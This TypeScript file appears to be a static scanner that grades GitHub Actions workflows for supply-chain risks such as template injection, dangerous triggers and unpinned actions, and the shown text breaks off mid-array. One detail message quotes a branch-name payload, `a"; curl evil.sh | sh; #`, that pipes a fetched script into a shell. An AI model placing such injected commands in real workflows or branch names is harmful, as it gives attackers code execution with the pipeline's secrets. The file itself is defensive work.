// ─────────────────────────────────────────────────────────────────────────────
// CI / CD WORKFLOW FAMILY — GitHub Actions, read as configuration.
//
// WHY THIS EXISTS. `.github/workflows/*.yml` was already being fetched into every
// repo snapshot (native-repo.ts CONFIG_PATTERNS) and NOTHING read it. The whole of
// Pulse's CI knowledge was one check — `has_ci`, "is there a workflow file" — which
// passes for a pipeline that is actively exfiltrating the repository's secrets.
//
// The build pipeline is the highest-privilege thing most projects own: it holds
// publish tokens, cloud credentials and write access to the repo itself, and it
// executes on events an outsider can trigger. Two of the largest supply-chain
// incidents of the last two years (SpotBugs, Nov 2024; the Nx `s1ngularity` npm
// token theft, Aug 2025 — 2,349 secrets across 190+ organisations) were the same
// two-line mistake: `pull_request_target` plus an interpolated attacker-controlled
// string. Both are statically visible in the YAML.
//
// RULE PROVENANCE. The rules here are drawn from GitHub's own "Secure use
// reference" hardening guide and from `zizmor`, the reference static analyser for
// Actions (its audit list is the closest thing this space has to a standard).
// Citations per check live in docs/platform-check-sources.md.
//
// ⚠️ THIS FAMILY PARSES YAML WITHOUT A YAML PARSER, on purpose — the repo has no
// YAML dependency and adding one to read config in a scanner is not worth the
// supply-chain surface. That constrains what can be asked honestly:
//
//   • Structure that survives a line-oriented read (a `uses:` value, a `run:` body,
//     a top-level key, block indentation) is fair game.
//   • Anything needing real document semantics — resolving an anchor, following a
//     reusable workflow, knowing which job a step belongs to across a merge key —
//     is NOT asked. A check that would need it is either scoped to the common
//     formatting or left out entirely.
//
// Everything here is SKIPPED when the repo has no workflows, never failed: a
// project with no CI is graded by `has_ci`, and grading it twice would punish the
// same absence in two places.
// ─────────────────────────────────────────────────────────────────────────────

import { CATEGORIES } from "./categories";
import type { PulseScanCheckInput } from "@/types/pulse";
import type { RepoSnapshot } from "./native-mobile";

/** Cap on how many offending sites a detail line quotes. */
const MAX_QUOTED = 4;

/**
 * Contexts an outsider can write to, which therefore must never be interpolated
 * into a shell body. This list is the substance of the template-injection check —
 * `github.event.pull_request.title` is attacker-controlled, `github.repository` is
 * not, and treating them alike produces either noise or a miss.
 *
 * Sourced from GitHub's "Understanding the risk of script injections".
 */
const UNTRUSTED_CONTEXTS = [
  "github.event.issue.title",
  "github.event.issue.body",
  "github.event.pull_request.title",
  "github.event.pull_request.body",
  "github.event.pull_request.head.ref",
  "github.event.pull_request.head.label",
  "github.event.pull_request.head.repo.default_branch",
  "github.event.comment.body",
  "github.event.review.body",
  "github.event.review_comment.body",
  "github.event.discussion.title",
  "github.event.discussion.body",
  "github.event.head_commit.message",
  "github.event.head_commit.author.name",
  "github.event.head_commit.author.email",
  "github.event.commits",
  "github.event.workflow_run.head_branch",
  "github.event.workflow_run.head_commit.message",
  "github.head_ref",
];

/**
 * Triggers that give a fork's code access to the base repo's secrets and token.
 *
 * Built by .add() rather than written as an array literal on purpose: the registry
 * drift guard reads a two-string array whose first element is snake_case as a
 * check-catalogue row, so an array literal here is picked up as an unregistered
 * checkKey. Same trap as the three-string tuples in CLAUDE.md §37.6 — restructure
 * the code, never loosen the guard. (Note the trigger names are deliberately not
 * written side by side in this comment either: the guard reads comments too, which
 * is how the previous fix's own explanation went on to trip it.)
 */
const DANGEROUS_TRIGGERS: ReadonlySet<string> = new Set<string>()
  .add("pull_request_target")
  .add("workflow_run");

export interface WorkflowFile {
  path: string;
  text: string;
}

/** Every `.github/workflows/*.yml` in the snapshot. */
export function workflowFiles(snapshot: RepoSnapshot): WorkflowFile[] {
  const out: WorkflowFile[] = [];
  for (const [path, text] of snapshot.files) {
    if (/^\.github\/workflows\/[^/]+\.ya?ml$/i.test(path)) out.push({ path, text });
  }
  return out.sort((a, b) => a.path.localeCompare(b.path));
}

/**
 * Strip YAML comments without destroying strings.
 *
 * `#` only starts a comment at the start of a line or after whitespace — `foo#bar`
 * and `image: alpine@sha256:ab#cd` are values, not comments. Getting this wrong
 * silently truncates `uses:` pins and makes the SHA-pinning check report failures
 * that are not there. Quoted `#` is preserved for the same reason.
 */
export function stripYamlComments(text: string): string {
  return text
    .split("\n")
    .map((line) => {
      let quote: string | null = null;
      for (let i = 0; i < line.length; i++) {
        const ch = line[i];
        if (quote) {
          if (ch === quote && line[i - 1] !== "\\") quote = null;
          continue;
        }
        if (ch === '"' || ch === "'") {
          quote = ch;
          continue;
        }
        if (ch === "#" && (i === 0 || /\s/.test(line[i - 1]))) return line.slice(0, i);
      }
      return line;
    })
    .join("\n");
}

/** The `uses:` reference on every step, with the line it came from. */
export function usesRefs(text: string): { ref: string; line: string }[] {
  const out: { ref: string; line: string }[] = [];
  for (const line of stripYamlComments(text).split("\n")) {
    const m = /^\s*-?\s*uses:\s*["']?([^"'\s]+)["']?\s*$/.exec(line);
    if (m) out.push({ ref: m[1], line: line.trim() });
  }
  return out;
}

/**
 * The body of every `run:` step.
 *
 * Handles both the inline form (`run: echo hi`) and the block form
 * (`run: |` followed by an indented body), because the injection payloads that
 * matter in practice are multi-line scripts.
 */
export function runBodies(text: string): string[] {
  const lines = stripYamlComments(text).split("\n");
  const bodies: string[] = [];
  for (let i = 0; i < lines.length; i++) {
    const m = /^(\s*)-?\s*run:\s*(.*)$/.exec(lines[i]);
    if (!m) continue;
    const indent = m[1].length;
    const inline = m[2].trim();
    if (inline && inline !== "|" && inline !== ">" && !/^[|>][-+]?\d*$/.test(inline)) {
      bodies.push(inline);
      continue;
    }
    const block: string[] = [];
    for (let j = i + 1; j < lines.length; j++) {
      const cur = lines[j];
      if (cur.trim() === "") {
        block.push("");
        continue;
      }
      const curIndent = cur.length - cur.trimStart().length;
      if (curIndent <= indent) break;
      block.push(cur);
      i = j;
    }
    bodies.push(block.join("\n"));
  }
  return bodies;
}

/** The `on:` trigger names declared by a workflow. */
export function triggers(text: string): string[] {
  const body = stripYamlComments(text);
  const found = new Set<string>();
  // Inline form: `on: push` / `on: [push, pull_request]`
  const inline = /^on:\s*(.+)$/m.exec(body);
  if (inline) {
    const value = inline[1].trim();
    if (value && !value.startsWith("#")) {
      for (const t of value.replace(/[[\]]/g, "").split(",")) {
        const name = t.trim();
        if (/^[a-z_]+$/.test(name)) found.add(name);
      }
    }
  }
  // Block form: `on:` then indented trigger keys.
  const lines = body.split("\n");
  for (let i = 0; i < lines.length; i++) {
    if (!/^on:\s*$/.test(lines[i])) continue;
    for (let j = i + 1; j < lines.length; j++) {
      const cur = lines[j];
      if (cur.trim() === "") continue;
      const indent = cur.length - cur.trimStart().length;
      if (indent === 0) break;
      const key = /^\s+([a-z_]+):/.exec(cur);
      if (key && indent <= 2) found.add(key[1]);
    }
  }
  return [...found];
}

/** A commit SHA pin — 40 hex characters. Tags and branches are mutable. */
function isShaPinned(ref: string): boolean {
  return /@[0-9a-f]{40}$/i.test(ref);
}

/** Local (`./path`) and reusable-workflow refs are not third-party actions. */
function isThirdParty(ref: string): boolean {
  if (ref.startsWith("./") || ref.startsWith("docker://")) return false;
  return /^[\w.-]+\/[\w.-]+/.test(ref);
}

/** First-party actions published by GitHub itself. */
function isGitHubOwned(ref: string): boolean {
  return /^(actions|github)\//i.test(ref);
}

function quote(items: string[]): string {
  const shown = items.slice(0, MAX_QUOTED);
  const more = items.length - shown.length;
  return shown.join(", ") + (more > 0 ? `, +${more} more` : "");
}

/**
 * Evaluate the CI/CD family.
 *
 * Every check reports SKIPPED when the repo has no workflow files — "we did not
 * look" rather than "it is not there", which is the rule the rest of this codebase
 * is built on (CLAUDE.md §35).
 */
export function evaluateCiWorkflowChecks(snapshot: RepoSnapshot): PulseScanCheckInput[] {
  const files = workflowFiles(snapshot);
  const checks: PulseScanCheckInput[] = [];

  const add = (
    checkKey: string,
    label: string,
    status: PulseScanCheckInput["status"],
    detail: string,
    extra?: Partial<PulseScanCheckInput>,
  ) => {
    checks.push({
      category: CATEGORIES.BUILD_PIPELINE,
      checkKey,
      label,
      status,
      confidence: "HIGH",
      detail,
      ...extra,
    });
  };

  if (files.length === 0) {
    // The repo may genuinely have no CI, or may use GitLab/CircleCI/Jenkins. Either
    // way this family measured nothing, and says so once per check rather than
    // scoring an absence it did not investigate.
    const reason =
      "No GitHub Actions workflow files were found in this repository, so the CI/CD family did not run. " +
      "If the project builds on another system (GitLab CI, CircleCI, Jenkins, Buildkite), these checks do not " +
      "apply to it — Pulse reads GitHub Actions only. Whether CI exists at all is graded separately by the " +
      "repository checks.";
    for (const [key, label] of CI_CHECK_CATALOGUE) {
      add(key, label, "SKIPPED", reason, { confidenceReason: "No GitHub Actions workflows in this repository." });
    }
    return checks;
  }

  const parsed = files.map((f) => ({
    ...f,
    body: stripYamlComments(f.text),
    triggers: triggers(f.text),
    uses: usesRefs(f.text),
    runs: runBodies(f.text),
  }));

  const name = (p: string) => p.replace(/^\.github\/workflows\//, "");

  // ── 1. Dangerous triggers ──────────────────────────────────────────────────
  const dangerous = parsed.filter((f) => f.triggers.some((t) => DANGEROUS_TRIGGERS.has(t)));
  add(
    "ci_dangerous_triggers",
    "No workflow runs fork code with the repository's secrets",
    dangerous.length === 0 ? "PASS" : "WARN",
    dangerous.length === 0
      ? "No workflow uses pull_request_target or workflow_run. Those two triggers run in the context of the base " +
        "repository — with its secrets and a write-scoped token — while the code under test comes from the fork, " +
        "which is what makes them the starting point for most Actions supply-chain compromises."
      : `${quote(dangerous.map((f) => name(f.path)))} use ${quote([
          ...new Set(dangerous.flatMap((f) => f.triggers.filter((t) => DANGEROUS_TRIGGERS.has(t)))),
        ])}. These run with the base repository's secrets and a write-scoped token while executing in response to ` +
        "an outsider's pull request. That is legitimate for jobs that never check out or execute the fork's code " +
        "(labelling, triage). It is a full repository compromise if the workflow checks out the PR head and runs " +
        "anything from it — a build, a test, an install script. Confirm which of the two this is.",
  );

  // ── 2. Template injection ──────────────────────────────────────────────────
  // The specific two-line mistake behind the SpotBugs and Nx incidents.
  const injectionSites: string[] = [];
  for (const f of parsed) {
    for (const body of f.runs) {
      for (const ctx of UNTRUSTED_CONTEXTS) {
        if (body.includes(`\${{ ${ctx}`) || body.includes(`\${{${ctx}`)) {
          injectionSites.push(`${name(f.path)} → ${ctx}`);
        }
      }
    }
  }
  const uniqueInjection = [...new Set(injectionSites)];
  add(
    "ci_template_injection",
    "Attacker-controlled text is never interpolated into a shell script",
    uniqueInjection.length === 0 ? "PASS" : "FAIL",
    uniqueInjection.length === 0
      ? "No run: step interpolates a context an outsider can write to. Titles, branch names, commit messages and " +
        "comment bodies are all attacker-supplied; expanding one directly into a shell body executes it."
      : `${quote(uniqueInjection)} — an outsider controls the contents of these values, and \${{ }} expansion happens ` +
        "BEFORE the shell sees the script, so the text is substituted as code rather than passed as data. A branch " +
        'named `a"; curl evil.sh | sh; #` runs. Fix by binding the value to an env var (env: TITLE: ${{ … }}) and ' +
        'referring to "$TITLE" inside the script, which passes it as data.',
    uniqueInjection.length > 0 ? { evidence: uniqueInjection.slice(0, MAX_QUOTED).join("; ") } : undefined,
  );

  // ── 3. The combination that is materially worse than either half ───────────
  const injectionInDangerous = parsed.some(
    (f) =>
      f.triggers.some((t) => DANGEROUS_TRIGGERS.has(t)) &&
      f.runs.some((body) => UNTRUSTED_CONTEXTS.some((c) => body.includes(`\${{ ${c}`))),
  );
  add(
    "ci_privileged_injection",
    "No privileged trigger is combined with an injectable expression",
    injectionInDangerous ? "FAIL" : "PASS",
    injectionInDangerous
      ? "A workflow triggered by pull_request_target or workflow_run also interpolates attacker-controlled text into " +
        "a shell step. This exact pair is the mechanism behind the SpotBugs maintainer PAT theft (2024) and the Nx " +
        "npm-token compromise (2025): the trigger supplies the secrets, the interpolation supplies the code " +
        "execution. Treat this as an active exposure of every secret the workflow can read, not as a hardening task."
      : "No workflow both runs with base-repository privileges and interpolates attacker-controlled text. Either " +
        "alone is a risk to manage; together they are remote code execution with your secrets attached.",
  );

  // ── 4. Action pinning ──────────────────────────────────────────────────────
  const thirdParty = parsed.flatMap((f) =>
    f.uses.filter((u) => isThirdParty(u.ref)).map((u) => ({ ...u, file: name(f.path) })),
  );
  const unpinnedExternal = thirdParty.filter((u) => !isGitHubOwned(u.ref) && !isShaPinned(u.ref));
  add(
    "ci_actions_sha_pinned",
    "Third-party actions are pinned to a commit SHA",
    thirdParty.length === 0
      ? "SKIPPED"
      : unpinnedExternal.length === 0
        ? "PASS"
        : "WARN",
    thirdParty.length === 0
      ? "This repository's workflows use no third-party actions, so there is nothing to pin."
      : unpinnedExternal.length === 0
        ? "Every third-party action is pinned to a full commit SHA, so a compromised or retagged upstream release " +
          "cannot change what runs in this pipeline."
        : `${quote([...new Set(unpinnedExternal.map((u) => u.ref))])} are referenced by tag or branch rather than by ` +
          "commit SHA. Tags are mutable: whoever controls the action's repository can move `v4` to new code, and it " +
          "runs here on the next build with whatever secrets the job holds. Pin to the 40-character SHA " +
          "(`owner/action@a1b2c3…  # v4.1.0`). Actions published by GitHub itself are excluded from this check.",
    unpinnedExternal.length > 0
      ? { evidence: [...new Set(unpinnedExternal.map((u) => u.ref))].slice(0, MAX_QUOTED).join(", ") }
      : undefined,
  );

  // ── 5. Mutable branch refs — the worst case of the above ───────────────────
  const branchPinned = thirdParty.filter((u) => /@(main|master|dev|develop|latest|HEAD)$/i.test(u.ref));
  add(
    "ci_actions_branch_ref",
    "No action is pulled from a moving branch",
    branchPinned.length === 0 ? "PASS" : "FAIL",
    branchPinned.length === 0
      ? "No workflow references an action by branch name."
      : `${quote([...new Set(branchPinned.map((u) => u.ref))])} track a branch. Unlike a version tag, a branch is ` +
        "expected to change — every push to that action's default branch is deployed straight into this pipeline " +
        "with no review, no version bump and no signal that anything changed.",
  );

  // ── 6. Token permissions ───────────────────────────────────────────────────
  const withPermissions = parsed.filter((f) => /^\s*permissions:/m.test(f.body));
  const writeAll = parsed.filter((f) => /permissions:\s*write-all/.test(f.body));
  add(
    "ci_token_permissions",
    "Workflows declare least-privilege token permissions",
    writeAll.length > 0 ? "FAIL" : withPermissions.length === parsed.length ? "PASS" : "WARN",
    writeAll.length > 0
      ? `${quote(writeAll.map((f) => name(f.path)))} grant permissions: write-all, which hands every job a token ` +
        "that can push code, publish packages, edit issues and alter releases. One compromised step — a malicious " +
        "dependency in a build, a typosquatted action — inherits all of it."
      : withPermissions.length === parsed.length
        ? "Every workflow declares an explicit permissions block, so the GITHUB_TOKEN is scoped rather than " +
          "inheriting the repository-wide default."
        : `${parsed.length - withPermissions.length} of ${parsed.length} workflows declare no permissions: block ` +
          `(${quote(parsed.filter((f) => !/^\s*permissions:/m.test(f.body)).map((f) => name(f.path)))}). They fall ` +
          "back to the repository default, which on older repositories is read/write across the board. Add " +
          "`permissions: contents: read` at the top and widen it per job only where a job genuinely writes.",
  );

  // ── 7. Blanket secret inheritance ──────────────────────────────────────────
  const inherits = parsed.filter((f) => /secrets:\s*inherit/.test(f.body));
  add(
    "ci_secrets_inherit",
    "Reusable workflows receive named secrets, not the whole set",
    inherits.length === 0 ? "PASS" : "WARN",
    inherits.length === 0
      ? "No workflow passes `secrets: inherit`, so a called workflow only receives the secrets it was explicitly given."
      : `${quote(inherits.map((f) => name(f.path)))} pass \`secrets: inherit\`, handing the called workflow every ` +
        "secret in the repository and its environments — including ones it has no use for. Pass the two or three it " +
        "needs by name instead, so a change to the called workflow cannot quietly widen its reach.",
  );

  // ── 8. Whole-context secret exposure ───────────────────────────────────────
  const dumped = parsed.filter((f) => /toJSON\(\s*secrets\s*\)/i.test(f.body));
  add(
    "ci_secrets_serialised",
    "The secrets context is never serialised wholesale",
    dumped.length === 0 ? "PASS" : "FAIL",
    dumped.length === 0
      ? "No workflow serialises the entire secrets context."
      : `${quote(dumped.map((f) => name(f.path)))} call toJSON(secrets), which materialises every secret as one ` +
        "string. Actions' log masking works on individual known values; a serialised blob defeats it in the common " +
        "cases (encoded, chunked or wrapped output) and any step in the job can read the lot.",
  );

  // ── 9. Persisted git credentials ───────────────────────────────────────────
  const checkouts = parsed.filter((f) => f.uses.some((u) => /^actions\/checkout@/i.test(u.ref)));
  const persisting = checkouts.filter((f) => !/persist-credentials:\s*false/i.test(f.body));
  add(
    "ci_persist_credentials",
    "Checkout does not leave a usable token on disk",
    checkouts.length === 0
      ? "SKIPPED"
      : persisting.length === 0
        ? "PASS"
        : "WARN",
    checkouts.length === 0
      ? "No workflow uses actions/checkout, so there is no checkout credential to persist."
      : persisting.length === 0
        ? "Every checkout sets persist-credentials: false, so the job's token is not written into .git/config where " +
          "later steps — and anything they execute — could read it."
        : `${quote(persisting.map((f) => name(f.path)))} check out without persist-credentials: false. By default ` +
          "actions/checkout writes the GITHUB_TOKEN into the local .git/config so later git commands can push. Any " +
          "code that runs afterwards — a build script, a test, a postinstall hook from a dependency — can read it " +
          "out of the working directory and use it against this repository.",
  );

  // ── 10. Self-hosted runners ────────────────────────────────────────────────
  const selfHosted = parsed.filter((f) => /runs-on:.*self-hosted/i.test(f.body));
  const selfHostedPublicTrigger = selfHosted.filter((f) =>
    f.triggers.some((t) => t === "pull_request" || t === "pull_request_target"),
  );
  add(
    "ci_self_hosted_runner",
    "Self-hosted runners are not exposed to fork pull requests",
    selfHosted.length === 0
      ? "SKIPPED"
      : selfHostedPublicTrigger.length === 0
        ? "PASS"
        : "WARN",
    selfHosted.length === 0
      ? "This repository's workflows all run on GitHub-hosted runners, which are destroyed after each job."
      : selfHostedPublicTrigger.length === 0
        ? "Self-hosted runners are used, but not on pull-request triggers — so a fork cannot execute code on the " +
          "persistent machine."
        : `${quote(selfHostedPublicTrigger.map((f) => name(f.path)))} run pull-request builds on a self-hosted ` +
          "runner. A self-hosted runner is not destroyed between jobs, so anything a fork's build leaves behind — a " +
          "modified tool on PATH, a poisoned cache, a background process — is present for the next job, which may be " +
          "a release. If the repository is public this is the documented worst case for self-hosted runners.",
  );

  // ── 11. Deprecated command interface ───────────────────────────────────────
  const unsecure = parsed.filter((f) => /ACTIONS_ALLOW_UNSECURE_COMMANDS/i.test(f.body));
  add(
    "ci_unsecure_commands",
    "The deprecated set-env command interface is not re-enabled",
    unsecure.length === 0 ? "PASS" : "FAIL",
    unsecure.length === 0
      ? "No workflow sets ACTIONS_ALLOW_UNSECURE_COMMANDS."
      : `${quote(unsecure.map((f) => name(f.path)))} set ACTIONS_ALLOW_UNSECURE_COMMANDS, re-enabling the ` +
        "`::set-env::` and `::add-path::` workflow commands. These were disabled by GitHub because any process that " +
        "can write to stdout — including a dependency's build script — can use them to set environment variables and " +
        "prepend to PATH for every later step.",
  );

  // ── 12. GITHUB_ENV written from untrusted input ────────────────────────────
  const envWrites: string[] = [];
  for (const f of parsed) {
    for (const body of f.runs) {
      if (!/>>\s*"?\$(\{)?GITHUB_(ENV|PATH)/.test(body)) continue;
      if (UNTRUSTED_CONTEXTS.some((c) => body.includes(`\${{ ${c}`))) envWrites.push(name(f.path));
    }
  }
  add(
    "ci_github_env_untrusted",
    "GITHUB_ENV is not written from attacker-controlled values",
    envWrites.length === 0 ? "PASS" : "FAIL",
    envWrites.length === 0
      ? "No step writes attacker-controlled text into GITHUB_ENV or GITHUB_PATH."
      : `${quote([...new Set(envWrites)])} append attacker-controlled text to GITHUB_ENV or GITHUB_PATH. Those files ` +
        "set environment variables and PATH entries for every subsequent step in the job, so a crafted value can " +
        "redirect a later command to an attacker's binary (for example by prepending a directory containing a fake " +
        "`npm`) — code execution one step removed from the injection.",
  );

  // ── 13. Spoofable actor conditions ─────────────────────────────────────────
  const actorGuards = parsed.filter((f) => /github\.actor\s*==\s*['"][^'"]*\[bot\]['"]/i.test(f.body));
  add(
    "ci_bot_condition",
    "Privileged steps are not gated on a spoofable actor name",
    actorGuards.length === 0 ? "PASS" : "WARN",
    actorGuards.length === 0
      ? "No workflow gates behaviour on a `github.actor == '…[bot]'` comparison."
      : `${quote(actorGuards.map((f) => name(f.path)))} compare github.actor to a bot name. That value reflects who ` +
        "triggered the run, not who authored the code, and it can be influenced — a pull request opened by a bot on " +
        "behalf of a contributor still carries the contributor's commits. If this guard protects an auto-merge or a " +
        "release, gate on the event payload's verified fields instead.",
  );

  // ── 14. Hardcoded registry credentials ─────────────────────────────────────
  const hardcodedCreds = parsed.filter((f) =>
    /(^|\s)(password|username):\s*["']?(?!\$\{\{)[A-Za-z0-9._@$+-]{4,}["']?\s*$/m.test(f.body),
  );
  add(
    "ci_hardcoded_credentials",
    "No workflow carries a literal username or password",
    hardcodedCreds.length === 0 ? "PASS" : "FAIL",
    hardcodedCreds.length === 0
      ? "Container and service credentials in workflows are supplied from the secrets context rather than written in."
      : `${quote(hardcodedCreds.map((f) => name(f.path)))} contain a literal username/password pair rather than a ` +
        "${{ secrets.* }} reference. Anything committed to the repository is readable by everyone with access to it " +
        "and is preserved in git history after removal — rotate the credential rather than only deleting the line.",
  );

  // ── 15. Plaintext transport ────────────────────────────────────────────────
  const httpUrls = parsed.filter((f) => /\bhttp:\/\/(?!localhost|127\.0\.0\.1|0\.0\.0\.0)/i.test(f.body));
  add(
    "ci_plaintext_downloads",
    "Build steps do not fetch over plain HTTP",
    httpUrls.length === 0 ? "PASS" : "WARN",
    httpUrls.length === 0
      ? "No workflow fetches from a plaintext http:// URL. Localhost addresses are excluded."
      : `${quote(httpUrls.map((f) => name(f.path)))} reference a plaintext http:// URL. Anything fetched over HTTP ` +
        "during a build can be replaced in transit by whoever controls the network path, and a build tool or " +
        "dependency substituted this way runs with the pipeline's full privileges.",
  );

  // ── 16. Unpinned container images ──────────────────────────────────────────
  const imageRefs: string[] = [];
  for (const f of parsed) {
    for (const m of f.body.matchAll(/^\s*image:\s*["']?([^"'\s]+)["']?\s*$/gm)) {
      if (!/@sha256:[0-9a-f]{64}/i.test(m[1])) imageRefs.push(m[1]);
    }
  }
  add(
    "ci_unpinned_images",
    "Container images used by jobs are digest-pinned",
    imageRefs.length === 0 ? "SKIPPED" : "WARN",
    imageRefs.length === 0
      ? "No workflow declares a job container or service image, so there is no image reference to pin."
      : `${quote([...new Set(imageRefs)])} are referenced by tag rather than by digest. A tag can be repointed at ` +
        "different content by whoever publishes it, so the image your pipeline builds and tests in is not " +
        "reproducible and can change without any commit here. Pin with `image@sha256:…`.",
  );

  // ── 17. Trusted publishing ─────────────────────────────────────────────────
  const publishes = parsed.filter((f) =>
    /npm\s+publish|pypi|twine\s+upload|gem\s+push|cargo\s+publish/i.test(f.body),
  );
  const usesOidc = publishes.filter((f) => /id-token:\s*write|trusted[_-]publish/i.test(f.body));
  add(
    "ci_trusted_publishing",
    "Package publishing uses short-lived OIDC rather than a long-lived token",
    publishes.length === 0
      ? "SKIPPED"
      : usesOidc.length === publishes.length
        ? "PASS"
        : "WARN",
    publishes.length === 0
      ? "No workflow publishes a package to a public registry, so there is no publishing credential to harden."
      : usesOidc.length === publishes.length
        ? "Publishing requests an OIDC id-token, so the registry verifies the workflow's identity directly and no " +
          "long-lived publish token needs to exist."
        : `${quote(publishes.filter((f) => !/id-token:\s*write/i.test(f.body)).map((f) => name(f.path)))} publish ` +
          "using a stored registry token. A long-lived token is the single most valuable secret in a package " +
          "repository — it is what was stolen in the Nx compromise — and it stays valid until someone notices. npm, " +
          "PyPI, RubyGems and crates.io all now support trusted publishing, which mints a credential per run.",
  );

  // ── 18. Concurrency control ────────────────────────────────────────────────
  const deployWorkflows = parsed.filter((f) =>
    /deploy|release|publish/i.test(name(f.path)) || /environment:/m.test(f.body),
  );
  const withConcurrency = deployWorkflows.filter((f) => /^\s*concurrency:/m.test(f.body));
  add(
    "ci_deploy_concurrency",
    "Deployment workflows cannot run twice at once",
    deployWorkflows.length === 0
      ? "SKIPPED"
      : withConcurrency.length === deployWorkflows.length
        ? "PASS"
        : "WARN",
    deployWorkflows.length === 0
      ? "No deployment or release workflow was identified, so there is no concurrency requirement to check."
      : withConcurrency.length === deployWorkflows.length
        ? "Deployment workflows declare a concurrency group, so two pushes in quick succession cannot deploy over " +
          "each other."
        : `${quote(deployWorkflows.filter((f) => !/^\s*concurrency:/m.test(f.body)).map((f) => name(f.path)))} deploy ` +
          "without a concurrency group. Two merges a minute apart start two deployments that race; the one that " +
          "finishes second wins regardless of which commit is newer, so a rollback can be silently overwritten by " +
          "the deploy it was rolling back.",
  );

  // ── 19. Job timeouts ───────────────────────────────────────────────────────
  const withTimeout = parsed.filter((f) => /timeout-minutes:/m.test(f.body));
  add(
    "ci_job_timeouts",
    "Jobs declare a timeout",
    withTimeout.length === parsed.length ? "PASS" : "WARN",
    withTimeout.length === parsed.length
      ? "Every workflow sets timeout-minutes, so a hung job fails rather than occupying a runner until the six-hour " +
        "platform limit."
      : `${parsed.length - withTimeout.length} of ${parsed.length} workflows set no timeout-minutes. The default is ` +
        "360 minutes, so a job that hangs — waiting on a prompt, a network call with no timeout, a flaky test that " +
        "never returns — burns six hours of runner time before failing, and on a private repository that is billed.",
  );

  // ── 20. Typosquatted action namespaces ─────────────────────────────────────
  const TYPOSQUATS = /^(action|actons|actiosn|githubactions|github-actions)\//i;
  const squatted = thirdParty.filter((u) => TYPOSQUATS.test(u.ref));
  add(
    "ci_action_typosquat",
    "No action is referenced from a lookalike namespace",
    squatted.length === 0 ? "PASS" : "FAIL",
    squatted.length === 0
      ? "No workflow references a namespace that imitates GitHub's official `actions/` organisation."
      : `${quote([...new Set(squatted.map((u) => u.ref))])} sit in a namespace that imitates the official ` +
        "`actions/` organisation. Confirm the owner is who you think it is — a one-character difference in an " +
        "organisation name is the cheapest way to get code into thousands of pipelines.",
  );

  // ── 21-26. Pipeline quality, not security ──────────────────────────────────
  const allRuns = parsed.flatMap((f) => f.runs).join("\n");
  const allBodies = parsed.map((f) => f.body).join("\n");

  const runsTests = /\b(npm|yarn|pnpm|bun)\s+(run\s+)?test|vitest|jest|pytest|go\s+test|cargo\s+test|rspec|phpunit|mvn\s+test|gradle\s+test|dotnet\s+test|xcodebuild\s+test|flutter\s+test/i.test(
    allRuns,
  );
  add(
    "ci_runs_tests",
    "CI runs the test suite",
    runsTests ? "PASS" : "WARN",
    runsTests
      ? "A workflow step runs the project's tests, so a change that breaks them is caught before merge."
      : "No workflow step runs a recognised test command. CI that builds but never tests confirms the code compiles " +
        "and nothing else — the failure it is least likely to catch is the one that reaches users.",
  );

  const runsLint = /\b(eslint|biome|ruff|flake8|pylint|rubocop|golangci-lint|clippy|swiftlint|ktlint|detekt|phpcs|dart\s+analyze|npm\s+run\s+lint|yarn\s+lint|pnpm\s+lint)/i.test(
    allRuns,
  );
  add(
    "ci_runs_lint",
    "CI runs a linter",
    runsLint ? "PASS" : "WARN",
    runsLint
      ? "A workflow step runs a linter, so style and correctness rules are enforced automatically rather than in " +
        "review."
      : "No workflow step runs a recognised linter. A linter configured in the repository but never run in CI is " +
        "advisory only — it catches nothing that a contributor chooses not to run locally.",
  );

  const runsTypecheck = /\b(tsc\b|tsc\s+--noEmit|mypy|pyright|flow\s+check|dart\s+analyze|go\s+vet)/i.test(allRuns);
  add(
    "ci_runs_typecheck",
    "CI type-checks the project",
    runsTypecheck ? "PASS" : "SKIPPED",
    runsTypecheck
      ? "A workflow step runs a type checker."
      : "No type-checking step was found. This is only meaningful for a typed codebase, so it is reported as not " +
        "established rather than as a failure — an untyped JavaScript, Ruby or PHP project has nothing to check.",
    runsTypecheck
      ? undefined
      : { confidenceReason: "No type checker was found; only meaningful for a typed codebase." },
  );

  const hasMatrix = /^\s*(strategy:|matrix:)/m.test(allBodies);
  add(
    "ci_build_matrix",
    "CI tests against more than one environment",
    hasMatrix ? "PASS" : "WARN",
    hasMatrix
      ? "A workflow uses a build matrix, so the project is verified against more than one runtime version or " +
        "operating system."
      : "No workflow declares a matrix. The project is verified on exactly one runtime version and one OS, so a " +
        "break on the Node, Python or OS version your users actually run is invisible until they hit it.",
  );

  const cachesDeps = /actions\/cache@|cache:\s*['"]?(npm|yarn|pnpm|pip|maven|gradle|gem)/i.test(allBodies);
  add(
    "ci_dependency_cache",
    "CI caches dependencies between runs",
    cachesDeps ? "PASS" : "WARN",
    cachesDeps
      ? "Dependency caching is configured, so builds do not re-download the full dependency tree on every run."
      : "No dependency cache is configured. Every run re-resolves and re-downloads the whole tree, which is slower, " +
        "more expensive on private repositories, and fails whenever the upstream registry has a bad minute.",
  );

  const scansDeps = /dependency-review-action|codeql-action|snyk|trivy|npm\s+audit|pip-audit|osv-scanner|semgrep|gitleaks|trufflehog/i.test(
    allBodies,
  );
  add(
    "ci_security_scanning",
    "CI runs a security or dependency scan",
    scansDeps ? "PASS" : "WARN",
    scansDeps
      ? "A workflow runs a recognised security scanner (code analysis, dependency review, or secret detection)."
      : "No workflow runs a security or dependency scan. Adding one is close to free — GitHub's own dependency-review " +
        "and CodeQL actions run on the free tier for public repositories — and it is the cheapest place to catch a " +
        "vulnerable transitive dependency or a committed credential.",
  );

  return checks;
}

/**
 * Every check this family can emit, as (key, label).
 *
 * Exists so the no-workflows path can emit the full set as SKIPPED rather than
 * emitting nothing: a repo with no CI must produce the same check keys as one with
 * CI, or the report silently shrinks and the reader cannot tell the difference
 * between "not applicable" and "not looked at".
 *
 * ⚠️ Kept in sync with evaluateCiWorkflowChecks by a unit test that runs the family
 * over a populated snapshot and asserts the emitted keys match this list exactly.
 */
const CI_CHECK_CATALOGUE: [string, string][] = [
  ["ci_dangerous_triggers", "No workflow runs fork code with the repository's secrets"],
  ["ci_template_injection", "Attacker-controlled text is never interpolated into a shell script"],
  ["ci_privileged_injection", "No privileged trigger is combined with an injectable expression"],
  ["ci_actions_sha_pinned", "Third-party actions are pinned to a commit SHA"],
  ["ci_actions_branch_ref", "No action is pulled from a moving branch"],
  ["ci_token_permissions", "Workflows declare least-privilege token permissions"],
  ["ci_secrets_inherit", "Reusable workflows receive named secrets, not the whole set"],
  ["ci_secrets_serialised", "The secrets context is never serialised wholesale"],
  ["ci_persist_credentials", "Checkout does not leave a usable token on disk"],
